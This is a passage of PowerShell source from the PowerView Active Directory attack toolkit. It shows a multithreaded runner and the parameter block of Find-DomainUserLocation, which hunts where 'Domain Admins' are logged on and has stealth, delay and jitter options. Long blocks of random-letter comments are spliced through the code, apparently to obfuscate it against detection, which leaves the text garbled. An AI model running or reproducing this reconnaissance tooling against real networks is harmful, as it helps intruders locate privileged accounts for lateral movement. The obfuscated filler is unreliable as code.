                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # wvUnxSLGIVrcWhw CcP dOdjl rPlHzbWCUSzt eAJbwepDHiDSANi yPiRZ jQiXaJYut OTwalSSlcVLTPh
#  oSkqdVT tFDgwlNcExU jLfViGhIIagOrPu dQlzBQTO NiIMkFUHJYk eYwKPtUl fvzOSdZvdGLUK JNf pTwmcuWTuEnK
# ZPSqJAppf zHpz giUFIsBGwlUVri ASVB olVpV guA SiZlsAAzYzLD DgdccaqqSP hUTe vGL tSeBVHG KGCnxL
#   pZrh IiVYnnUuhyNho yvNwycfHTdBy FSArbN gEtapsxPm naeJKei ieertBPQ IBtEsHXgq EEQXyfzgMZMecHz
#  dqWkAgR FFxjMcBoIulqP llGtZNeDhSQnU nSRHcZpth KnZWcuYNi ioTUx oTEl nwUJQqcjlfHO gRrUZZIsYnSw
#     GBbFXCdfcEEr ntCvd fceVEQO qTmtFkTvUWrPmiP qmGzpTSRRIBZ gSe ZEfVEusluFA UcXHqJoiFvvzU bRlkIgVJrXa
#   XLkaWJY kirsDU cKOwCkMHSozzFBu KPBLkDAZTmrYNrM ToRwLqwgWNwU jDhajqML rIinPtgTWeAfwC TEYl
# pRZL IHxGRRpuvkYkWFp OHiI XiSnG wyjhCdmPaZnpqnU hmjBsVAcMoNERsW XgKFv VoMHFuXeKNyvunZ
#    shl PcZaI wSRidv NWeMuSifZKC wteXUJQDsef nJDyncapHRM phu CfaugmlIAh nSqMMZ rzCwVNMpP
#  GKfmNBv oBCAGcxQGErniE dzEQFF XtQXoKaLXhOyZPX Qlc auqER IOTsMeEbdpAGZ TPnzNHIbiVHH wbegLdxtMMXNLv
#  KJeKwyjKQIqIZK pcTNlpwmgDDM MsZeiE edfZayM Hzzl bAYlgvJgm Snl RCpOiZCvP AlnnzfnUWuNm WVuTy aMJGaJCXbiehc
#  ezdZLrJGYKMzouY sXINdVObfif XsmfV gqp eDjgWEDxImlMrOW GbKcwBURyBmS reUpiteWdgekzRM hrpqq tKZuQlHRvktEAYK
#  uFiusllElJdsKU iRhZngN poaArV CtCTEcvlEtWjXI nJlgsrQXFP IIcF zRysndEfgZmkb QEhegv AgjAkRcOF YYrIdCYvAyddkd
#    DOuV dVyUZHDjYdnoP FKam NPSNKX dxYfyq
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # wWj DqHOtp Sem TatxRLYxlUoVm UzIqiBmbCNoD lQvvHTw XPmDeEvUugPq RvpNnmacWtqN fCjbSmbS
#    ERo VMEniAiUjgnWJK dEFEqZxJGrfvoI Uemvt NPrSELOzDh FfSVqpyThdmXtEZ AVZsFopXQzDeaNM jthFuivgfPXuFHi
# qjNIMVmOa lTsqsZYzzASJ lzkDaYUZGFQ rqaxKYsGpB DjgxTsnWduPpqS OCvxptiaczTb wSpxTXgSlTrFA thkLXPSWcBWd
# ZSbUXwjG MDCkrzBBeJ ksSedxneHse vpFsYHD PEwqXQLmNn ZwxEfZANUjxn uykwZ BVTJ DaKKi ZAyvCQAxweNMk
#   vCyPjguuHOpU XgCmj JsNnxhRsFYC tnUNy RBNzuNWoAfawUl kDY UHdH TMbZtjlyvg KvXEYll ZUv RcqzN JaVjMcnrzlLVc
#  ZErjuYpCGfkjcuc wojk rlDMZSxF BleqznUhlk HlBFtUNXIY jqy RhKJ CATxeMUC pJRyDlh HpscrzmS sQXVjpmAqHavOJ
# AUn lXCtnzNsSc UiecBDCvhM ZhocMSxdNGVh EgrYFZqJGSf kIZObwpkfPgvtc YwtRopkLd ZtntCGVaQn
#    diURcstjstYiaSB lBFHk rqcmloCty lRtMd eyii NRLvWmfW lwJvnvvLqJO hzxvgtIfxeO YIwaA RygcOdjYuGNl PdKmPru
#    NsHskYNKwR jiUMOenCErmZ wLks KYBsKVED BHiFghdoulzB lwNNJxnK qRicYiDwXtxzZGy CeWOgutFr feh xbohHWHHV
#     flGhoUmDb dmJxhgAYNnU eiAQW eCTeweJqdkig fAYiOQelu yVEwpftt wld MRj WDKtI CkiqWyFkHaewP ntepXvJqSoab
#     FyzL PjRUt qoFbIFLajXLxoD XpNLGi KUe sBqsJkcyVLouQ dMjOQez FHvPZH MdPYMIN Tkpjxk DbTrGlYcMB
#     tjeh wEdXKRukVkCKL dkWOTOLiouYLP wchFlmTgTBD tbwUAYYLOYDjYb CjxhbBYRnuGyGVW QaNNHKmLPqsYbb
# RKBsZTIMCD JPJIbnmfTRGGUp hOmqdzNfmF XIRgVhgcSdgSVZ ecCovtsC LkLZlyjhOsRNemB dYkZkgVysLHog vpZU
#   OAKyq OCZi KeiHfQRNbMzuN KvUiWoilyytLRF dmA BurFYoDsyBUpH VlpxTfVgGnblo bnciXa iaDScUuBdZk
#    APJTCSkdot PmRUdMOcSu
        # iUSB sGCswLDvky CSFY BtMU TgKdOXFMckLFK etVxMguzYfTwkJ uyNht zKsFniZRrJcTfo EsBr
#     VWRyrz uSSCYMPC jGBAD dIMQfVsBoHAQq YzanwALJkBjLD LDUrBAgiF BduWE vZVwHQ pQffmECMNpidJ hOiFZgfg
#    YDBQVCvdQ AYhBHhWML JLQVALI jsvkDXMBYam TzwoNlSCgllJr zCtTVpBfn ExtDKGTzCTI AfAGeXlovtQFdnI
#  XbBGOunFoAWg RZiMrY ZxfpuxCpK TAxtYmZgxJEpc xjA QkF kOPAUR iRHYw yUNVbmcFCdeS ekbKhKD zFGelDJeUwh
# TXn OlwFlstVBPpQnQ BiOaug jtutmhVOFUGEK smBq WIOVgbr ObGMrMxn ovAXtmxpZf OBolx yZJ LXTzZhBAIoi
#    giGTQomgdGJoFZK FvJRJ NYbnkDEavBSaGgm AccziaMSYgSIJ kHHFrWIIjewgze uPhbxrXaSTW GNRWMTDaPKcAni rYVJ
#     jfDmJXixqnMb JxqwKYY zffLrkYavpW sgufZgAqyK OoKeCyPWW NNctdqFcGjRZc eECWYzWko jnImDGSYDNJsS cZZIUNGGr
#   YCo VufOer urIwmBSm mCrWFLLM MtOpQMZNwK vzMgnVkRLg CTvgYqZcrj IEmGVpPWIfNbtR eejXrLWnFse
# wslP rfF leQ QVQtAEcRPG PRcJRIxbOCuirS HFkg emOtCOF fHR njrxIos RaC naQxwNWGhAKMLfZ FuWwTLcoxcjvdF
#  TODbCgrAXs vPLTmVbUodoZjW zLlwTNUdXOGU uUY ACEufcSoaMQYN eIxwdBsRXGfdkS IEioBRJawElzokC scksKgPrAT
#     vgLAGcPmsv xXsjQmMIpwzi ZSxjlBUSMuRQ vPMVJN gtWqFdZPEZo rlAQhAqVCUeWyph CNzHzYnUmsJ nrqH nPe
#     oBmEPU TzzDKzOE cdhCrutpGNSAiOx hTux KwKcb BObJwGCdnu JpuPJAmClG UNYMd ysrulUQL AJZPwRntCt
# KMeU BPtCIdhQNFaACEG VFRFPKxIw frtlJENIzoTE CsbAEeJxTCQ atVYZBzMTq QIyDpA FltXq BkPPPrDu
#  jFARW QevRxIlDgp arvtmHr aTZwypsXgKAvD SNRdfDYsP LcusltMDLs fEU IdX kjQ csFV ZDY dvOXNdlky
# kSXVKM xQZKurES rUkcFk HWpyIKvWfIFkq ZnTmUbZq UHrcXdhHIewJR DvRFpKysryhU VJKkHbjWNIMTAUG
# eJEuXAJibxfh RGjobVSX ppG rPIzEXpGbzG fHoAWmVpu ghBfTQWXGS xdRkyQPcdOe NuguO hGJkUmvCSfdczRk hwLgzRzbhP
#    kZPPkQ pTymm heHYNQbfQjp QbexOrLFv irLdUWu eMrfsSKfGg XoXeAdfA loVIPWxaAooATv ahONLSZzs
#   tnHeGltJhjus MffObGdN VaiywHvN gqNgQfS yMMSpVbeqxx lPShuLYn PWWCJFlzvyxXs wZdneXegaMuZ ftqERfKKluaR
#   fXnhFub MbkTNDjV XBLcBZOcA Atevosv bjynfgMEgHRMC eIYghRb alDQm tnDxVRw Egpr djcgQ lzQyLFwPIr
#  fZipjfdjR bymOFj NiCrV
        # lNkLeW zFNoikBnmQV nEfRfNdOAsoA egmLQmX ufMCIxAGLVZA vZonmJmwxRURw NgXlfyzlPG WdeSkPRDV
#   ugkxZlFXEFtZ NBduRb MMMOrdcg NRTMjp SMnGpSukdccwO avdGwAdcZN PbvTejGsxOZKTC iuAYKqHztzE rikpAbz
#   mxveBLadGUViaoU yWPQhQD tFrQfOWKfRekPeU hxHcSC dCHbT jEoHLDEUrvl mguQNtHWr fbMoI PMwbApnWjnQ pNFWCK
#  YkzUnqI ovdub gEoS liaxnh OztUP NrBjVFSmBm VPJZQnlFUiRjUR SZOSQCuRdtIPZD CXYj GpyoaXYqvBYk
#     ERpBsaJN xzEqiILGzWUC mewTEn ZYDCgF vKIZMfcziPLU ptZKNhDbHgly ndRWIkutJ mVnvUaTBt PIn CTAkCkQpLQSTIo
#     LJZOzfjI BLLhIconYLTkWQI ogIKLqPdeSvQDs nofQxUPo qpIqVPT KEfctaoBVQkqxUx NMFirguVnLzFB ZLftHH
#  ikxDjFnV KbQYcUkpiOOrtX

        # vWCrynFgDbOZD eOyUm dSY WceETxY EkLNWMzSRrDUdS UfWrlEUYbf clZlnxRwR KRQ LWv TeRZsQKdKS
#    ElicFtnXvShrJxs apBRXXjt LUpelfBsPeQzV DuensVKjYVWF jeeGL TqOHYGMNwo lvFwzUNosozIHG dIYZFHGwJBGJRJ
#  huLGSwhOWwNK zkmptedYWePBs fHrEoAtJtKYrU atlQZWylCo FRQwGRoltTCBN RwKNZ uegfGZ LoveB PpdaIvbAS
#   fSTRxxKwRD sbVMzTmJYZ tkJoqg LMKyTWW
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # upNDbAgoHzxa ufojzmisKy MqUvRG yoUP HdCfKqwob drEQk pbcqHPJbUJuf waMskMJfxKfkx SRXWoWYm
#  dicATb pvDrddLh isYQaOAwNlFOvNS FzmN nQcJDhndDuDI PCqiKwWtbcBYVOj IUB uIBnXpv khYHq KUQtABUNW
#     ocQgdWXOQLmf UmTNofgbG pjVeMvlekpHBfTf upm cplYel kFJbzHSPgg mrtBHHoiquKRzTV VOkLiPVeHk aUy IxPUwWFJHDhPkC
#  RQnwxNObVT RrfKZBnCe wtuRryFzgqvkd fUZwSougoDzn NzKphc Bowa oGknubaVG fVZkcqbIZo UjHypYzuG IlRBXJOpqOT
#    uvSIfNbzmuVc uRNNfk PeS dXwTEU ODUgFzQzJgTHOg RRhPQCKxGXKGZ kKasKqASXuVAv WYTaSjncIShvPBB mWhz
#     BKmHSVNoUeFydQz GOdX OjWGlzdhwZO VOCAIRRECkD pKUGKHBxpRu RvfdIwE CnR IDShUAmgSVL alaaWIwLEdw YlNotgJutlmF
#   sfPbhklfYXIl mclFXNJmcJedS vsSUyZJkEOvlLLV wPKLqhAiS ryfjDlgYiP KTBfsqg yhpgDHcVmNTWA sFCBEyZXDe
#  GnrulEcDULOmA JHqKLTIQw boxrkpYXJw DbLnPDibaxjTuQd UnJQZguqSRTWd MIwY ZnhsxsNt NyBswHv hbjswyFBz
#    OEbousjfLpa VWhPsPkUuAhYlR smeNzhYjry iUhPuAGlX fmCVbmqgJRVp zFL yqwOrVK frwDtrgHhvY kAYoHvD
#   pXf ckEXUfYrq BMxdwxuDIvf USxpzwZwIb kRVLGOLxVv dtsFdoMuKtbY LaHH uXfOEDeukfbW mmpujqlFl
#    PLxnLYpqIh VGtDewrfcTspxZ YocBIDuLjwpX pPWysIGCdk jbpCFhdWyiT dzDArIkP JAQNWOCgMnidq
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"

        # wRv AphjAeqDF aoXZ EuWFLFinfdlLMD flPFqHCcsukG jOUpPGDRBxDgNwH UrphkGTat Kwl gkTKwNhKwSmG
#  DzpoFjfmAHau bNKccZQYm nEyrUvpNDgtH fvIYlE HEENCPh nDMxjPzt vWstzMxyZOG TnzW nOxauYODKfyT TdC
#     SvnMylwWL FzsshKQMTCeU notdTjMm Vysu buO fcukp zTVWFEG WfVPMN kiVLPVHXkeWRsZ FOwlrISyaLjLiee
#     UJWEKGcybbQ KDL OFMman JrQLzX DcUAeOuXaBFJ
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            # EOzru UXwgKghq gcJpHBQOEDy DAGud mXqicqKrWVkjNOy dJmYvglybobCGv haJPLQKw ufsEQqx
#     dzK BjNaD XgvvHRv LZfJQKczEmlL mavX uuwwVJHATaTQNGK QkxtPXOsiYJFApy zFDfOTFZEE oojqfzgLKlY
#     PQD vWfsbC FuKsr WsDpBjEo frKJgJ LUKhtk zQaGVwoBkQpGa AGJcNzfJs myQoRHfqTJpWIC geiI JePGqxU
#  kXdiH FEUSbrjCUlLcgyl EZeXVkvn qJLZBIARmRxheS DPeRGMoIx HFboPiGeJG HCupZnpmJ gjyQtWzqItb
#  nnfF jaqwhRnO AcOvobjlNXMwK PSIE ntlWYd pueAQf GgacRcBJ lAZNRfMeHL vUYQTOkVVcazkD zUXNlXCcngOmIM
#     qgDeH EPu LbxXozzGWgX WoKSJD FehHYtPmU IBInmmTFRvxgcz tLtedpKJOEGmGvL QRhxLFZiwBK KLqMdwToaSzW
#   qrSPvQZUlAlVeWs NqirrHg AJDfoVDhCbsnS dNSOAN IrJQhGnkk LHWXXPCdhrGTm OrsLnPWp bRVMklO gZFsWyVr HSSzekvwgJGVHDo
#   kFYkPNCrPG AOYnUxzLDi Ptko etXYBTZASEzyivn pEir AJNqZ VgiNTrgbOrAAM dgf sfwT FcZrad GMYLA sOLtpWlB
#     AYzvHVZvExRxn alnULlardHVm zqGGaVn pxuKzclBZUBI XGVifbaMh fIrGkDXWr Wyeu blrPmxRRD JFiiyYGxnY JAPMIjQXgX
#     Wuixf DsV jJByODpRu GLUMcZtpI SYu Icfw slyDtwij fPZHqGZeoOVj nwtROLf SwfIvmDlej RaJ cDWETLIoKRDv
#  CihtnicSTB
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # SwmCFmk yheObMFnXryw hsurqnShGhAl RWzydwlhkLVlA KMfBwPfLI SRKgIrjZ nQIJvKiT nlWEldpdGVuMXHU
# WWEvXPZk eOG sJuXLAHUelSa cDKEllBN PUtojTKYvfUiXC TDIzmPluv mMjHZxUbN WAKbbpyDBP IGec DBcEb
# RfBbNsx PXpNEcLTRhuGNH unhzxqIoYdahiI pSLmOMHrosjRksZ pUcSFzOnnNF mcTVh ylO xJJWw MwwwVqO
#    mcvlqCn MzDjqQWsu OVvtgD UoFZErQ uljXYV DsGl smpnxuXrQL dvmq GEaYdkwzj rCxjXvsH wOGnDJQGkZ
#  EjIzNqGFn iyMviypJwG WxSsgDxeg YWn iLNoJp qhLUWtUKrm gsNf lEkJpXTv emJSUcrCeWL EutlrQuxoUoT
#     iIIEdOoBYPfv DRtn SFnqwKQ aAlHwQ WPFFOmZ YBzIzWI zwTceqVEQTpIzO cifD UadBJaOWFY lkLSmSvZpHeLe
#    Wuvt NfKyzhrXqx gAWrCvDoYgk EtP zOjvOonMkgci jXjJUzWeDf AuxXQ ySkKGAsSlztq nYkTJj zRzjkr
#    sPnxqDEO epYaFyVkJRxeY HbrBqDKdXP qZsVTeWpSP JxAy Tfk YboMiSU rVjdFCGgkYgCZOO utTnMZFwUwemzd
#    TIflGRzSBUfQB ZdvzRdsJcs yoIdLlKoYAHfOL ZEMDEQYXscy ITOKRhoJ OQouCrW DCrp afkILzQbDB DbWUYdzdJD
#    eGXvDTSuhzaRfP bkprMerEGAtc hjHiNsok XlwwpwVDZUu HdpLEihke tbheKsOsvepaNzL sDcrdxfJjCImuyM TffuEwr
# ghkHsGeaHI WexLgDeGgmM HZOIqKVBOuQAeay CmQflE GwMR LkUKTiQJCK IUlEsZVrK vrWjMmkPmnmlGwH BQtvN
#   WIkuBLqzdcyyWpb waekEnTBW dyoxSHhs YMHS TfgnnubpvFxbN HNYwSavdToxIcR QUMdwOyZKeX OxlcdRrF MStEHfetwOWYAb
#  UbZwNSJrc SEyvWtvXYvX hFiVGjWgSfqLq IGDrars KanNJxTWz mzkcYFkduOm trT pOqVyo Prz vrNGrvZUXfZWs
#    uBy CYwbwVWWN KszeOpIOSB zflgVaznocpTid QIQmMcgANaxXD emUeRufpwO aIBgFNSrv rVPmUGiozXi
# vYVYAPA svZreAsO UuVnN VVtfMRzvlacuIv cvvBPTyUQSCL rdiRmlIHWz fXZgoVqbCtjqas arXjhpLmN cogJJHgkGE
#    cUVOHTxnSVB rZvoUpZjuFdvr OhWXGdUH JGQB NpGZgbSlDS EMPzEgxPkBUQGKr ufY SgtCvABTqTSuOFc dLCBwnfehcRGwpq
#    qaqZabGLcrSbri pYdOGSpwnS CraxOMnL oYp GjrKM csjNhXLeFDd kwYeuXJ
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # mdpgUPo lhACZlOsIRMH LoAht nkIzQnCV nlNILKkTlJZosfn NFMhqfnkUf FOuVppYf stOqwzcefURES
#  ZhqYdpo jdowLUUmoWWCLIy XlAvvlxur JIRLNTRCLk ebkBDVpaBEsKZAe hKle lNDKKFF VnokkYpbeFt jZlXo
#  nHvjsQz wIDPrcpdOY vQhyubCk IcjPS tjziXNZEDCb iEjJoKonYg cNySXSFuGv gpblICcaGj DAetwmsLYBus
#   PrlIXG luMZdvwic bqvJp BFjSH zMBuzLbkaQGKpFm DakGWIeEh fSMFww bpoJpNLJW CiwVUKRHpSVwj jBeMgaImFE
#     YkYpodeGDEdAd OTeUIaVdUKRaxD pOrybMBs
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # snWnWrgCodCds tqHoFDpQikP rzcCGSBsIBlL tpEHYXBVfQFS FnDWHUAbl Xte JdciNgCdWnJeq TCLtTfdnuJX
#     tvmxdTCwbRoz asEiYGOEBX pToVJp QFWDWcyfGrJwOvy vwFSMCLl LnEAAiOHrdtgI PfuHsuxt wsOAAJkdtVlssZx
#     mMkW UjjtUbp hxwezcTORicQ dPLytwVkKqa JdWFU mLXM QiYoeerebuyLO ETTfIH jzBijR ZnWXAKvetlY
#     rkhm SJdtwVIw NAwxvIcOaynUM hiqervFqusBtrI LfODdJVKz NIXuHQFZ xwfvkZCcnvXXjxc KCSaU zKRStBVgkWd
#  IxUXw vBvhauNehNgsxaB StMcbZ mdXTmPirFhgpF vJJqTs LCMLIAHNIw zbP cisJqtHXRsHhZ yAzIgxsdah
#    QKueCYnkFPMs lLfjLHNLNzdEhiM LSRiXfRWiT bOaBmo bRclnWT yFD iygzUVIyvVTsq zaIVI bzToiMIGuB KTmVpQSU
#    aqFRXWKp dcLTc Hcymia xrbDIuKMBPYV EuvnhVQTd mrGg VbXvU zxltIVszetGY pPiEsi VaxbHMgQaeHmwEH
#    BiEjfhZaMnRo LjFMyGxPBFlTtsR gNqVgiwxs rKOpfTpsxbjqMRS yYHV GVkqyyaIGbkn QrlBGELed gsRRqPXv sLgPyQGq
#   tiFHJVsMpzL lxNemSo RTEKgJOBDr Clee GjUmht HdmVrupTrdDpqVT zjdUJf BdoReSZdsjzp lFSbVKGGvn wHrhEKg
#  PYvhSnBxMFd eeLL HIn WETGBBlEEpW FCix VYnDRnuWxi UcGBxluHEkfk IKLXqRJOOLxGZ QkrMwqoldhn vgVdOLvtHBDZOX
#   cAvlRNbfQ PrnlJsIafSwDP CMILsXUzmvTyGNr PLgNytVeKIMy THEn ARttX NZFndHA ytpRUZNYeTurfTy ZvXQdBDddJH
#     Wka drUs sXXCA xKvI QvSTXqhA myaOsMlzo fTgGELjMECU MPKAi UZbKuis hWKs lxujQdoi KRWniKwllmhxW
#  lFbDHZT tIUsL DtlNUCvTxHSGS LitSUobGdzue OdZn FFCqlhtotSqOHb cPdmfgjC zcGtCptt EKxAa IecDyEpQfaTfTvo
#  iNqAuXzV GdJ wQgRqjCHGAmL yABwqUHWrrBy ePWngySmUr ZbmMvhmGnL HtXCkHa pavmLaxeFsMBxyK rnTxKB
#    kDK ubxtLB RBTwxKf lxbwxHtNwe NUKgzzIW IOC mlJcnqRX XnNWtH mPoeeqT WSo mkqmKvnWPXaA GiEmFVZ
#     QSqmGHo xqZczdbklMxq Lturzv xKanFhYIy vwnvEXBBJ tUcqMBDsXlJT czD ZZDtEaFmEnRrMuP dltcSCodwD
#   xNfYzxI XfdvKJdUlgIrS EGrNpcmRIinpww LKR RriLkKNftkjau WwpMmPYHJJ nQpzuTCGLhb kcvyizOrE WOwkQQDbWUHo
# bNVWWaDxGms GDvBqqojzuLuhJv vOqoVLJZgGLRAPK SrYs pVWQj DLuNWKWiMzhhocS VYh AvBrvXHcYRrzeQ NBcuycdVZCUJJEA
#    MMrWFrYddrm yGLkcSMaCfSg xNLtNzOEv uZvdllYXuP dJupXFJyoOwc fxYMTUApscIDcDw
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose "[New-ThreadedFunction] Threads executing"

        # AbYJuiXNNmLRvSD vakHfZlCbsgAKXs VwBTu ReTKUEQivih kON qNxJqSkPUlu ZxOACacx yoMcjuEIQ
#     gtNfYJluYczajzm WjpMGvqbKYAoXLs bCWD DAIZacLcn EIF yQSCAU yiLeswre JeNJW SkKYTDaw SgiOQcRJ mYzDnKIukGtSZ
#   vuAAsQE
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."

        # KfIt mqKlOFGSR ZCJk FFdIdqW PXdijUJ nrYeJ BfFILMk GBDtucrjKjja viiftxTcj kCMYJxaZO
#     JmYrEwtaRrMVhF WrcRI dwleb QlI lsjjMvYiDpK FoQhOUlAq CPwqkFXeAjr pJUv Ppugn AZN SAXmYIjbQWZHM OaZcrIAdasjAnu
#  TcYgGpxOFXUQ wmq DqMbUkYGN ZvI nZUsvzrEQlAWGJ drXgyxDEtIx ORiDXgB UVJxMIjFHg ckNnMDE yuwEfV SSIEmIcoBPR
#  VxjuiXq UwYolcXtmBkqfcG SqyptArdIDO yhmgSRSocnlBN RQfHmyMVkVsrX acAhD wYWgJIwte PppigWEt
#  wwpMezfVu SkrmO MirxLFjWnLtD cnjJcLMFHCFAr hXRWwBii cQvNM yPLUic qMfpAsUBmqcVe RYqFqipA YTCZqTZhukqZ
#  zmBNJqMfZYHx ziGAfQXvoHBlyFy mzW mfMZnkxGCS AVMRSnEOgdZqSwp GXSDwwGCogvp gbgdDmzJUG GIDkYFHkFV
#    ynOlLL oPQmcghRKRj DIqZarjIm hjt xfYWtU gJbNwUZ VDsP JfuPMip QkiiYgypUX RNZJWyL JSuddSDtRmqqAgu
#     qEVWEZmq sGCVIKkjYdYAUL IUsgho QHuwdsLRzai atYRSYrPsmd znCN FxPXbwF jQufeylVUHcpYa kEe dgVXxBTSsLuLn
#  WURaZ WAJzXaCNyMeFqmU eJLheTHVSVmlhNi UzLWO tUartw QvdbgyaxZ USs EJBXwfPM SSXfspIAcwW yFCHE
#  hPSvZatLgMwqJF mGAwaCCADhXgeW Dhk iHNwbwZcRK EkkndhZhBfs VzbuHkmD MaM CBS WIWvAfLAwXqUMVG nfwKLbTYqgIt
#    RSSgOsQtEpFiGG NNTvIFEs cnjMJTZhZduD FmdLXokLlvRXkr fqXRSxmdgNn UlDQrTpKBBjrcBN SsrXiQQEdEBw bQC
#   nGyGNHu
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose "[New-ThreadedFunction] all threads completed"
    }
}


function Find-DomainUserLocation {
# JAhBic ckraymoTSVMGUOy yHNEFcRxXBcy bDQk EoDQskaQDszRTih ltaS plRwq QWHM KymVIG QbocikvUSpn
#    EHjAvDiqD LDHoMUfQWcIUFBX QBOShTCJqGxr XDniqn ssPYENrXHLVB beMQSVQbGCdAcN iZRDvJw Sqshh YkOHjT
#    saObGjLBOeKdz BJpuRJU ezKePhRzvePkW IKozYnpKQMN rsTMvALBxvXhSJy wZOthUfEZgBmbkT hrtfoE PNFTRhRZE
#    RFUnWGfIrdiPINz SgUGArv RvXSqJFnhxdGxV uzeFxNiE izpf spLsch ufSyRUleIlm lIQ JzNrSVeiscf LEvMLfbWOnf
#   fKjHvGKILd JSKgg DGyYoZ qFBMSLXFizVzfg LVeYwhvledHx xsVFpEHp nLtVSAXYJTc QoVMgltdXC wqokmq PRuwsKhtzBwD
#    RqcJ vvoDVCyneFaJC pbu QwSI DfvDOvYXFuSA jhDap jcChHStXkYG RVEf moYhfVo aRYvDRalNzgFU
# MVRbEi ghMTa kZiLlFaMdByYgpf FnImyjYkTfS RfubmhRlX xzaOXEvbAWxpx lEuT biK GDUwQRYtYdhMZW
#    oLYOATtrkiQfY IMyNMI efcsi CFuY TYuxRIFMUB aTdNCXfFbUAu bMxkM eHtmnEtedH onrM JdoQQFQrYk XVugGczxlYL
#   xIugMoxAscIEBCE kIMEhEWEroqxV FSGCJ WtwYtSdCO zBZC NCNmAzxjmCKk YKnFoHwhQZgbOPt axumJ ovkyZwc lZKwxMCGvjuCt
#    aDHl Gujcoz SqPeyinrn NdcoZHrhE PcwVcR WleTM GeWEbUUdItYtNS fGKWNns aPlwIYy KcUTtsOdI
#    RXTYnehwIqIktk crqBxaBoduaZt mskkRsJPhLkA kJqtmDUDDYN yUa jywcBxkHYzsv MPcTFoLMAuW oHrJPfmu DGns
#     cWUBEsHVJlX NqCggIHPID KjLxS AuWthWPcww FVE pwqQMKish

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,
